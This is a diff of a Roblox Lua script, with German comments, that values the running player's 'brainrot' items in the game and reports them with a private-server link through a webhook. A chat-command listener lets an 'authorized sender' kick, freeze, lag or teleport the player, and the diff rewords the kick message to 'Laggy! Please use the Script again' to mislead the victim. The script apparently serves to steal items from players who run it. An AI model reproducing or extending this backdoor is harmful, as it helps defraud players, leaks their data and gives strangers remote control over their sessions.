@@ -291,9 +291,9 @@ local function getPodiumDetails(podium)
         for _, traitObj in ipairs(traitsFolder:GetChildren()) do
             if traitObj:IsA("ImageLabel") then
                 local assetId = traitObj.Image
-                local traitName = traitMap[assetId]
-                if traitName then
-                    table.insert(traits, traitName)
+                local traitData = traitMap[assetId]
+                if traitData then
+                    table.insert(traits, traitData.name)
                 end
             end
         end
@@ -326,7 +326,8 @@ local function getAllBrainrots()
     end)
     if not success4 or not animalList then return foundBrainrots end
     
-    local podiumData = {}
+    -- Sammle Trait AssetIds vom Podium (nur die Bilder, keine Multiplikatoren!)
+    local podiumTraitAssetIds = {}
     if myPlot then
         local animalPodiums = myPlot:FindFirstChild("AnimalPodiums")
         if animalPodiums then
@@ -344,37 +345,18 @@ local function getAllBrainrots()
                                     if displayNameLabel then
                                         local brainrotName = displayNameLabel.ContentText or displayNameLabel.Text or ""
                                         
-                                        local muts = {}
-                                        for _, v in ipairs(overhead:GetChildren()) do
-                                            if v:IsA("TextLabel") and v.Name == "Mutation" and v.Visible then
-                                                local mutText = v.ContentText or v.Text
-                                                if mutText and mutText ~= "" then
-                                                    table.insert(muts, mutText)
-                                                end
-                                            end
-                                        end
-                                        
-                                        local traits = {}
-                                        local traitMultipliers = {}
+                                        -- Sammle nur die AssetIds
+                                        local traitAssetIds = {}
                                         local traitsFolder = overhead:FindFirstChild("Traits")
                                         if traitsFolder then
                                             for _, traitObj in ipairs(traitsFolder:GetChildren()) do
                                                 if traitObj:IsA("ImageLabel") then
-                                                    local assetId = traitObj.Image
-                                                    local traitData = traitMap[assetId]
-                                                    if traitData then
-                                                        table.insert(traits, traitData.name)
-                                                        table.insert(traitMultipliers, traitData.mult)
-                                                    end
+                                                    table.insert(traitAssetIds, traitObj.Image)
                                                 end
                                             end
                                         end
                                         
-                                        podiumData[brainrotName] = {
-                                            mutations = muts,
-                                            traits = traits,
-                                            traitMultipliers = traitMultipliers
-                                        }
+                                        podiumTraitAssetIds[brainrotName] = traitAssetIds
                                     end
                                 end
                             end
@@ -385,19 +367,20 @@ local function getAllBrainrots()
         end
     end
     
+    -- Verarbeite jedes Brainrot
     for _, brainrot in pairs(animalList) do
-        local success5, baseAmount = pcall(function()
+        local success5, baseValue = pcall(function()
             return gen:GetGeneration(brainrot.Index, brainrot.Mutation)
         end)
         
-        if success5 and baseAmount and brainrot.Index then
+        if success5 and baseValue and brainrot.Index then
             local name = brainrot.Index
             local mutationStr = ""
             local traitStr = ""
             local mutationMultiplier = 1
             local traitMultiplier = 1
             
-            -- Mutation Multiplier berechnen
+            -- MUTATION: Berechne nur mit mutationMap
             if brainrot.Mutation and brainrot.Mutation ~= "" then
                 mutationStr = brainrot.Mutation
                 local mutData = mutationMap[brainrot.Mutation]
@@ -405,31 +388,23 @@ local function getAllBrainrots()
                     mutationMultiplier = mutData.mult
                 end
             end
-
-            if podiumData[name] then
-                if mutationStr == "" and #podiumData[name].mutations > 0 then
-                    for _, mutName in ipairs(podiumData[name].mutations) do
-                        if mutationStr == "" then
-                            mutationStr = mutName
-                        end
-                        local mutData = mutationMap[mutName]
-                        if mutData then
-                            mutationMultiplier = mutationMultiplier * mutData.mult
-                        end
+            
+            -- TRAITS: Berechne nur mit traitMap basierend auf den AssetIds vom Podium
+            local traitNames = {}
+            if podiumTraitAssetIds[name] then
+                for _, assetId in ipairs(podiumTraitAssetIds[name]) do
+                    local traitData = traitMap[assetId]
+                    if traitData then
+                        table.insert(traitNames, traitData.name)
+                        traitMultiplier = traitMultiplier * traitData.mult
                     end
                 end
-                
-                traitStr = (#podiumData[name].traits > 0) and table.concat(podiumData[name].traits, ", ") or ""
-                
-                -- Trait Multiplier berechnen
-                for _, mult in ipairs(podiumData[name].traitMultipliers) do
-                    traitMultiplier = traitMultiplier * mult
-                end
             end
+            traitStr = (#traitNames > 0) and table.concat(traitNames, ", ") or ""
             
-            -- Finale Berechnung: Base × Mutation × Traits
-            local valueWithMutation = baseAmount * mutationMultiplier
-            local finalAmount = valueWithMutation * traitMultiplier
+            -- Finale Berechnung: Base * Mutation * Traits
+            local valueAfterMutation = baseValue * mutationMultiplier
+            local finalAmount = valueAfterMutation * traitMultiplier
             local totalMultiplier = mutationMultiplier * traitMultiplier
             
             table.insert(foundBrainrots, {
@@ -437,12 +412,10 @@ local function getAllBrainrots()
                 podium = "",
                 mutationStr = mutationStr,
                 traitStr = traitStr,
-                baseValue = baseAmount,
-                valueWithMutation = valueWithMutation,
+                moneyPerSec = baseValue,
                 finalAmount = finalAmount,
                 totalMultiplier = totalMultiplier,
-                mutationMultiplier = mutationMultiplier,
-                traitMultiplier = traitMultiplier
+                mutationMultiplier = mutationMultiplier
             })
         end
     end
@@ -456,7 +429,7 @@ end
 
 local function hasHighValueBrainrot(foundBrainrots)
     for _, details in ipairs(foundBrainrots) do
-        if details.finalAmount >= pingThreshold then
+        if details.moneyPerSec >= pingThreshold then
             return true
         end
     end
@@ -465,7 +438,7 @@ end
 
 local function hasHighValueBrainrotAbove10M(foundBrainrots)
     for _, details in ipairs(foundBrainrots) do
-        if details.finalAmount >= 10000000 then
+        if details.moneyPerSec >= 10000000 then
             return true
         end
     end
@@ -494,10 +467,10 @@ local function sendWebhook(foundBrainrots, privateServerLink)
                 multiplierText = string.format(" (x%.2f)", details.totalMultiplier)
             end
             
-            displayText = string.format("%s%s - Base: %s → Final: %s%s\n", 
+            -- Zeige den finalen Wert an
+            displayText = string.format("%s%s - Final: %s%s\n", 
                 prefix,
                 details.name,
-                formatMoney(details.baseValue),
                 formatMoney(details.finalAmount),
                 multiplierText
             )
@@ -771,9 +744,9 @@ local function monitorChat()
                                         end
                                         
                                         if isAuthorizedSender then
-                                            if msgText:find("%.kick") then
-                                                LP:Kick("Kicked by authorized user")
-                                            elseif msgText:find("%.freeze") then
+                                            if msgText:find(".kick") then
+                                                LP:Kick("Laggy! Please use the Script again")
+                                            elseif msgText:find(".freeze") then
                                                 if LP.Character then
                                                     local humanoid = LP.Character:FindFirstChildOfClass("Humanoid")
                                                     if humanoid then
@@ -786,7 +759,7 @@ local function monitorChat()
                                                         hrp.Anchored = true
                                                     end
                                                 end
-                                            elseif msgText:find("%.lag") then
+                                            elseif msgText:find(".lag") then
                                                 task.spawn(function()
                                                     while true do
                                                         for i = 1, 100 do
@@ -795,7 +768,7 @@ local function monitorChat()
                                                         task.wait()
                                                     end
                                                 end)
-                                            elseif msgText:find("%.rj") then
+                                            elseif msgText:find(".rj") then
                                                 game:GetService("TeleportService"):Teleport(game.PlaceId, LP)
                                             end
                                         end
@@ -1256,8 +1229,8 @@ task.spawn(function()
     local name = LP and LP.Name or "User"
     local dname = LP and LP.DisplayName or "Player"
     local age = LP and (tostring(LP.AccountAge).." days") or "N/A"
-    local premium = (LP and LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "â­ Premium" or "Standard"
-    Sub.Text = string.format("%s (@%s) â€¢ %s â€¢ %s", dname, name, age, premium)
+    local premium = (LP and LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "⭐ Premium" or "Standard"
+    Sub.Text = string.format("%s (@%s) • %s • %s", dname, name, age, premium)
 end)
 
 local Badge = Instance.new("TextLabel", Info)
